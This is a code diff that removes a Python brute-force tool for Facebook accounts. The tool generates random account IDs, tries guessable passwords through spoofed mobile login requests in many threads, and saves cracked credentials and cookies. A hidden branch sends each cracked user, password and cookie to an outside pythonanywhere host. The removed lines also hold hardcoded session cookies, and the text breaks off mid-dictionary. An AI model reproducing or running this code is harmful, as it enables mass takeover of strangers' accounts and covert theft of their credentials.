@@ -1,652 +1,397 @@
-#si6xd
+import urllib.parse
+from urllib.parse import quote
+import re
 import os
 import sys
-import re
-import bs4
-from bs4 import BeautifulSoup
-from bs4 import BeautifulSoup as sop
-import time,subprocess,platform,uuid
+import json
 import random
-import base64
-import string
+import urllib.request
+import hashlib
+import time
 import uuid
 import requests
+import base64
+import datetime
 from concurrent.futures import ThreadPoolExecutor
-try:os.mkdir('/sdcard/j4rvis')
-except:pass
-R = '\x1b[1;91m' 
-OR = '\033[1;35m'
-G = '\033[1;97m' 
-Y = '\x1b[1;93m'
-O = '\x1b[1;98m'
-B = '\033[1;34m'
-W = '\033[1;97m'
-cyan="\033[1;36m"
-ugnn = []
-redmi=[]
-for x in range(1000):
- rr = random.randint
- rc = random.choice
- A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
- B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
- C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
- D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
- se = f'{A}{B}{C}{D}'
- if se in redmi:pass
- else:redmi.append(se)
-try:
-  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-  open('socksku.txt','w').write(proxylist)
-except Exception as e:
-  print(' server error')
-proxsi=open('socksku.txt','r').read().splitlines()
+from rich.panel import Panel as panel
+from rich import print as prints
 
-sim_id = ''
-android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
-model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
-build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
-fblc = 'en_GB'
-try:
-        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-except:
-        fbcr = 'Jio'
-fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
-fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
-fbdv = model
-fbsv = android_version
-fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
-fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
-try:
-        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
-        total = 0
-        for i in fbcr:
-                total+=1
-        select = ('1','2')
-        if select == '1':
-                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-                sim_id+=fbcr
-        elif select == '2':
-                try:
-                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
-                        sim_id+=fbcr
-                except Exception as e:
-                        fbcr = "Jio"
-                        sim_id+=fbcr
-        else:
-                fbcr = 'Jio'
-                sim_id+=fbcr
-except:
-        fbcr = "Jio"
-device = {
-        'android_version':android_version,
-        'model':model,
-        'build':build,
-        'fblc':fblc,
-        'fbmf':fbmf,
-        'fbbd':fbbd,
-        'fbdv':model,
-        'fbsv':fbsv,
-        'fbca':fbca,
-        'fbdm':fbdm}
+# Global variables
+Uid, Uuid = [], []
+Ok, Cp, Loop = 0, 0, 0
 
-build = device['build']
-model = device['model'] 
-ex = device['fbdm']
-android_version = device['android_version']+'.0.0'
-facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
-bv = f"{random.randint(1111111,7777777)}"
-versi_android = f"{random.randint(4,13)}"
-fbcr = sim_id
-fbmf = device['fbmf']
-fbbd = device['fbbd']
-fbdm = device['fbdm']
-uge = []
-bkas = []
-for xd in range(50000):
-    aa='Mozilla/5.0 (Linux; Android'
-    b=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
-    c=f''+model+' Build/'+build+''
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(80,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
-    uge.append(uaku2)
-pc = random.choice(['Windows NT 6.1; WOW64','X11; CrOS x86_64 8172.45.0','Windows NT 10.0; Win64; x64','X11; Linux x86_64'])
-for Xr in range (9999):    
-    a=f"Mozilla/5.0 ("+pc+""
-    b=random.randrange(6, 12)
-    c=random.randrange(3, 13)
-    d='Build/'
-    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
-    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    g=random.randrange(80,100)
-    h='0'
-    i=random.randrange(4200,4900)
-    j=random.randrange(40,150)
-    k='Safari/537.36'
-    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
-    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
-    m=random.randrange(1,9)
-    n=random.randrange(1,9)
-    o='0'
-    p=random.randrange(5,20)
-    uaku=(f'{a}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
-    ugnn.append(uaku)
-ugn = []
-realme = random.choice(["D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w","SM-A515F","SM-A235F","SM-A525F","SM-A715F","SM-G996B","SM-A705F","SM-A315F","V2183A","I2223","V2307","V2314","I2217","V2239"])
-for Xr in range (50000):
-    a='Mozilla/5.0 (Linux; Android'
-    b=random.randrange(6, 13)
-    c=random.randrange(3, 13)
-    d='Build/'
-    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
-    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    g=random.randrange(100,150)
-    h='0'
-    i=random.randrange(4200,4900)
-    j=random.randrange(80,150)
-    k='Mobile Safari/537.36'
-    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
-    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
-    m=random.randrange(1,9)
-    n=random.randrange(1,9)
-    o='0'
-    p=random.randrange(5,20)
-    uaku=(f'{a} {b}; {realme}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
-    ugn.append(uaku)
+# Color codes
+WHITE = '\x1b[1;97m'
+RED = '\x1b[1;91m'
+GREEN = '\x1b[1;92m'
+YELLOW = '\x1b[1;93m'
+BLUE = '\x1b[1;94m'
+PURPLE = '\x1b[1;95m'
+CYAN = '\x1b[1;96m'
+ORANGE = '\033[38;2;255;127;0;1m'
+RESET = '\x1b[0m'
+campur = random.choice([WHITE, GREEN, YELLOW, BLUE, PURPLE, CYAN, ORANGE, RESET])
 
-usragt=[]
-for xd in range(10000):
-    a='Mozilla/5.0 (iPhone;'
-    b=random.randrange(1, 9)
-    c=random.randrange(1, 9)
-    d='CPU iPhone OS 18_0 like Mac OS X)'
-    e=random.randrange(100, 9999)
-    f='AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/'
-    g=random.randrange(1, 9)
-    h=random.randrange(1, 4)
-    i=random.randrange(1, 4)
-    j=random.randrange(1, 4)
-    k='Mobile/15E148 Safari/604.1'
-    my_time=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-    usragt.append(my_time)
-
-
-    aa='Mozilla/5.0 (Linux; Android'
-    b=random.choice(['6','7','8','9','10','11','12'])
-    c=' iPhone 13 Pro Max)'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    my_time=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-    usragt.append(my_time)
-
-def generate_user_agent():
-    rr = random.randint
-    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
-    rx = random.randrange(1, 999)
-    return (f"Mozilla/5.0 (Windows NT {rr(9,11)}; Win64; x64){aZ}{rx}{aZ}) "
-            f"AppleWebKit/537.36 (KHTML, like Gecko){rr(99,149)}.0.{rr(4500,4999)}.{rr(35,99)} "
-            f"Chrome/{rr(99,175)}.0.{rr(0,5)}.{rr(0,5)} Safari/537.36")
-def cek_apkk(session,coki):
-    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f"\r {Y}[{G}!{G}{Y}] {G}Sorry No Active Apps Found")
-    else:
-        print(f"\r {Y}[{G}•{G}{Y}] {W}Active Apps Or Websites")
-        for i in range(len(game)):
-            print(f" \r%s {Y}[{G}%s{G}{Y}] %s %s"%( G, i+1, game[i].replace("Ditambahkan pada"," Ditambahkan pada"),G))
-    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f"\r {Y}[{R}!{R}{Y}] {R}Sorry No Expired Apps Found")
-    else:
-        print(f"\r {Y}[{R}•{R}{Y}] {W}Expired Apps or Website")
-        for i in range(len(game)):
-            print(f" \r%s {Y}[{R}%s{R}{Y}] %s %s"%( B, i+1, game[i].replace("Kedaluwarsa"," Kedaluwarsa"),B))      
-
-def cek_apk(session,coki):
-    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-            pass
-    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-            pass      
-loop = 0
-oks = []
-gen = []
-bkas = []
-cyan="\033[1;36m"
-faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
-logo = (f"""
-{faltu} {black}"Confidence is my best accessory".... {pvt}         
-\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[1;97m[\033[1;31m✓\033[1;97m] Author     : SUMONᴾᴿᴼ
-\033[1;97m[\033[1;31m✓\033[1;97m] VERSION    : =(.)=
-\033[1;97m[\033[1;31m✓\033[1;97m] Tool Types :\033[1;36m RANDOM 
-\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
-
-myid=uuid.uuid4().hex[:5].upper()
-def __iam_a_porche():
-    os.system('clear')
-    print(logo)
-    print('\033[1;92mChecking Approval ....\033[0;97m')
-    try:
-        httpCaht = requests.get('').text
-        t1 = base64.b64encode(str(os.getuid()).encode('utf-8'))
-        t2 = base64.b64encode((str(platform.uname()[2])).encode('utf-8'))
-        uid = os.getuid()
-        kex=(f"BCC-{uid}TS{t1}")
-        gen_token=(f"{kex}")
-        fkeyx = gen_token.replace("b'","").replace("'","")
-        if fkeyx in httpCaht:
-            lumd()
-        else:
-            os.system('clear')
-            print(logo)
-            print('Your Key: '+fkeyx)
-            print(47*"—") 
-            print('This was a private tool')
-            print(47*"—") 
-    except Exception as e:
-        #print(e)
-        print('\n\033[1;31m error..\033[0;97m')
-
-def lumd():
-    os.system('clear')
-    print(logo)
-    print('\033[1;92mChecking Approval ....\033[0;97m')
-    try:
-        httpCaht = requests.get('https://github.com/Jarvis-070/approval-/blob/main/approval.txt').text
-        t1 = base64.b64encode(str(os.getuid()).encode('utf-8'))
-        t2 = base64.b64encode((str(platform.uname()[2])).encode('utf-8'))
-        uid = os.getuid()
-        kex=(f"BCC-{uid}TS{t1}")
-        gen_token=(f"{kex}")
-        fkeyx = gen_token.replace("b'","").replace("'","")
-        if fkeyx in httpCaht:
-            mainn()
-        else:
-            os.system('clear')
-            print(logo)
-            print('Your Key: '+fkeyx)
-            print(47*"—") 
-            print('This was a private tool')
-            print(47*"—") 
-    except Exception as e:
-        #print(e)
-        print('\n\033[1;31m error..\033[0;97m')
-        
-def m():
-    os.system('clear');print(logo)
-    print(f'{Y}[{W}1{Y}] {W}HOST 1 ')
-    print(f'{Y}[{W}2{Y}] {W}HOST 2 ')
-    print(47*"—")
-    m = input(f'{Y}[{W}?{Y}] {W}Choose Method : ')
-    if m == '1':
-        main()
-    elif m == '2':
-        mainn()
-    
-def main():
-    os.system('clear')
-    print(logo)
-    code = input(f"{Y}[{W}~{Y}] {G}CHOICE CODE {W}: ")
-    #code2 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
-   # code3 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
-    #code = random.choice([code1,code2,code3])
-    limit = input(f'{Y}[{W}~{Y}] {G}TOTAL LIMID {W}: ')
-    for a in range(int(limit)):
-        awm = "".join(random.choice(string.digits) for _ in range(6))
-        gen.append(awm)
-    with ThreadPoolExecutor(max_workers=80) as Submits:
-        print(47*"\x1b[1;97m—") 
-        for next in gen:
-            ids = code + next
-            mk = ids[:6]
-            xx = ids[:7]
-            v = ids[:8]
-            b = next[:6]  
-            passlist = [mk,xx,'57273200',v,'57575751','57575752']
-            Submits.submit(cracker,ids,passlist)
-
-def convert(cookie):
-    cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
-    return(str(cok))
-
-def cracker(ids,passlist):
-    global loop,oks,cps
-    session = requests.Session()
-    sys.stdout.write('\r \033[1;97m[\033[1;97mRNDM•1\x1b[1;97m] \033[1;97m%s\x1b[1;97m | \033[1;97m%s\x1b[1;97m \r'%(loop,len(oks))),
-    sys.stdout.flush()
-    try:
-        for pas in passlist:
-            #nip=random.choice(proxsi)
-            #proxs= {'http': 'socks4://'+nip}
-            #moz = random.choice(usergent)
-            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
-            bv = f"{random.randint(1111111,7777777)}"
-            versi_android = f"{random.randint(6,14)}"
-            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
-            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
-            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
-            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
-            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0388496f-9bad-4e7f-b2df-62e676ad873e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated"
-            requu1 = session.get(url1)
-            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
-            #url = "https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            headers = {"authority": "mbasic.facebook.com",
-            "method": "POST",
-            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5479901a-9393-4dd1-8689-a89daffb52fc%26tp%3Dunspecified%26cbt%3D1734959969869&lwv=100",
-            "scheme": "https",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-encoding": "gzip, deflate, br",
-            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "content-type": "application/x-www-form-urlencoded",
-            "dpr": "3",
-            "origin": "https://mbasic.facebook.com",
-            "referer": "https://www.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5479901a-9393-4dd1-8689-a89daffb52fc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%23_%3D_&display=page&locale=bn_IN&pl_dbl=0",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-model": "\"\"",
-            "sec-ch-ua-platform": "\"Linux\"",
-            "sec-ch-ua-platform-version": "\"\"",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "same-origin",
-            "sec-fetch-user": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": us,
-            "viewport-width": "980"}             
-            response = session.post(url,data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
-            #print(headers)
-            log_cookies = session.cookies.get_dict().keys()
-            if "c_user" in log_cookies:
-                #kuki = convert(session.cookies.get_dict())
-                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
-                user = re.findall('c_user=(.*);xs', kuki)[0]
-                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
-                res = requests.get(ckk).text
-                if 'Photoshop' in res:
-                    if "confirmemail.php" in response.url:
-                        if len(bkas) % 2 == 0:
-                           statusok = f"NOVERY|{user}|{pw}|{coki}"
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f"{green}(ATOM-NV) {user}|{pw}")
-                           print(f"{green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-CONFIRMMAIL.txt", "a").write(f"{user}|{pw}|{coki}\n")
-                           oks.append(user)
-                           break
-                    else:
-                        if len(bkas) % 2 == 0:
-                           statusok = f"{user}|{pw}|{coki}"
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f"{green}(ATOM-OK) {user}|{pw}")
-                           print(f"{green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{user}|{pw}|{coki}\n")
-                           oks.append(user)
-                           break
-            elif "checkpoint" in log_cookies:
-                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
-                user = coki[24:39]
-                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/ATOM-CP.txt', 'a').write( ids+' | '+pas+'\n')
-                cps.append(ids)
-                break
-            else:continue
-        loop+=1
-    except requests.exceptions.ConnectionError:
-        time.sleep(20)
-    except Exception as e:
-        #print(f"\nError: {e}")
-        pass
-
-def mainn():
-    os.system('clear')
-    print(logo)
-    code = input(f'{Y}[{W}~{Y}] {G}CHOICE CODE {W}: ') 
-    limit = input(f'{Y}[{W}~{Y}] {G}TOTAL LIMIT id {W}: ')
-    for a in range(int(limit)):
-        awm = "".join(random.choice(string.digits) for _ in range(6))
-        gen.append(awm)
-    with ThreadPoolExecutor(max_workers=60) as Submits:
-        print(47*"\x1b[1;97m—") 
-        for next in gen:
-            ids = code + next
-            mk = ids[:6]
-            xx = ids[:7]
-            v = ids[:8]
-            b = next[:6]  
-            passlist = [mk,xx,'57273200',v]
-            Submits.submit(crackerr,ids,passlist)
-
-def convert(cookie):
-    cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
-    return(str(cok))            
-
-def crackerr(ids,passlist):
-    global loop,oks,cps
-    session = requests.Session()
-    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
-    sys.stdout.flush()
-    try:
-        for pas in passlist:
-            #nip=random.choice(proxsi)
-            #proxs= {'http': 'socks4://'+nip}
-            moz = random.choice(usragt)
-            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
-            bv = f"{random.randint(1111111,7777777)}"
-            versi_android = f"{random.randint(6,14)}"
-            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
-            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
-            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
-            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
-            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://m.prod.facebook.com/"
-            head = {"authority": "m.prod.facebook.com",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "dpr": "3",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "none",
-            "sec-fetch-user": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": us,
-            "viewport-width": "980"}
-            requu1 = session.get(url1,headers=head)
-            cookies = {
-    'datr': 'OpqVaPyImvfQapu_w36Tb6w9',
-    'sb': 'OpqVaFnrZ4qPlR6kiDeA96JW',
-    'ps_l': '1',
-    'ps_n': '1',
-    'checkpoint': '%7B%22u%22%3A100076124771608%2C%22t%22%3A1761821228%2C%22step%22%3A0%2C%22n%22%3A%22zR8K7Z2gmA4%3D%22%2C%22inst%22%3A833802479167237%2C%22f%22%3A465803052217681%2C%22st%22%3A%22c%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221761821236.ch.s%3Apw.tDBEAiANy_zVMFS2rH43v8yXhvwNN0OTiP-6BCNUD2DdO5J3pAIgZmo2xFaBGLcRW8C-Tc2oRA6lS9LCxW4RT04Lay7H9Kg%22%2C%22tfvaid%22%3Anull%2C%22tfvasec%22%3Anull%2C%22sat%22%3Anull%2C%22idg%22%3Afalse%2C%22cidue%22%3A%22%22%2C%22tfuln%22%3Anull%2C%22tfvri%22%3Anull%2C%22ct%22%3A%22ARFOlTbCW2SIgn5yhiuOXYNFXE48wNWZCFrbxZL_ZokoH1G9YLv8vQfCrn4yCjUEtXhPIFbYArPs9CD4p_gVro4qMkkLgc7gtmKahW4WzB0l8x-IcTKpTlsT4ls04uGyomYh_AdHRksyihaGwAjVT1PonBCIRaEFHocUgC2LPW-LRT0f4wWB6WM94g5V4l2FbwmcemeiQE_0lHS-VqbiOhbxP6L4Q6Fy8ar2_OegGGsuvXAO5PUrX46HJzYUAQfZCUkvPmhk4FG5Y-oXpfidafhSDlg39iLHweDMmMLN6apkcI3oqoIPwp72HQY6SIvNoU8t2B5Z4sRAwmPi2HLeCU1hVuvDvZKcUHE3bTTOH-Pmb8jp5hxt87pIAJKEsHg5lOlKvhc5aSlIayk_k39V0BYgWpE%22%2C%22s%22%3A%22AWW9CPHk0ka_oCs1guI%22%2C%22cs%22%3A%5B%5D%2C%22ssp%22%3A1%7D',
-    'locale': 'en_GB',
-    'fr': '0d03NCqOrCpkAOC5C.AWc4St76onCKKbOacCvrA9UMRL2pS1Gs1viTj9fYEqcfQzRPHSc.BolZo6..AAA.0.0.BpA0LR.AWcdVIjgH-4J6K4agwT7zRhIprI',
